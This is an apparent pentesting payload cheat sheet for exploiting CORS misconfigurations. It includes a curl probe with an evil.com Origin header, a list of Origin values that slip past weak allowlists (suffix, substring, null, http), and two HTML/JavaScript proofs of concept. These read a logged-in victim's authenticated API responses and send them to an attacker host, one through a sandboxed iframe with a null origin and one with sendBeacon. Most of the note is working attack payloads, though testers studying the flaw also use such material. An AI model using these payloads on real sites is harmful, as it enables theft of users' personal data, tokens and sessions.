---
title: "Payloads: CORS Misconfiguration"
type: payloads
tags: [payloads, cors, misconfig, access-control, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: CORS Misconfiguration

Exploit permissive `Access-Control-Allow-Origin` to read authenticated cross-origin responses (OWASP A05/A01). See [[cors-sop]].

## Test (reflect Origin?)
```bash
curl -s -I https://t/api/me -H "Origin: https://evil.com" | grep -i access-control
# vulnerable if:
#   Access-Control-Allow-Origin: https://evil.com   (reflects arbitrary)
#   + Access-Control-Allow-Credentials: true        (lets you read with cookies)
```

## Origin reflection / weak allowlist bypass
```
Origin: https://evil.com                       # arbitrary reflected
Origin: https://target.com.evil.com            # suffix match flaw
Origin: https://eviltarget.com                 # substring "target.com"
Origin: https://target.com.evil.com / https://sub.target.com   # if *.target.com trusted -> XSS on any sub
Origin: null                                   # if "null" allowed (sandboxed iframe/data: sends Origin: null)
Origin: http://target.com                      # http allowed -> MITM
```
`null` exploit:
```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://t/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil/?'+btoa(d)))</script>"></iframe>
```

## Exfil PoC (ACAO reflects + ACAC true)
```html
<script>
fetch('https://t/api/account',{credentials:'include'})
 .then(r=>r.text()).then(d=>navigator.sendBeacon('https://evil/',d));
</script>
```

## Real-world
ACAO origin-reflection with `Allow-Credentials: true` lets any attacker page read a logged-in victim's API data (PII, tokens, CSRF token -> chain to CSRF). `null`-origin and `*.domain` trust (one subdomain XSS = read all) are the common variants.
